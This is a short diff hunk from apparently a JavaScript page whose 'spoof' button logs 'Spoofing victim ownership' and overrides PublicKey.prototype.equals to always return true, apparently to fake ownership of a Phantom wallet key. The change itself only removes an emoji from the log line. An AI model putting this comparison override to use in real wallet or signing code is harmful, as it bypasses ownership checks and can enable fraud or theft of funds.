@@ -47,7 +47,7 @@
     };
 
     document.getElementById("spoof").onclick = async () => {
-      log(`🔒 Spoofing victim ownership by patching vulnerable Phantom module...`);
+      log(` Spoofing victim ownership by patching vulnerable Phantom module...`);
 
       const originalEquals = PublicKey.prototype.equals;
       PublicKey.prototype.equals = () => true;
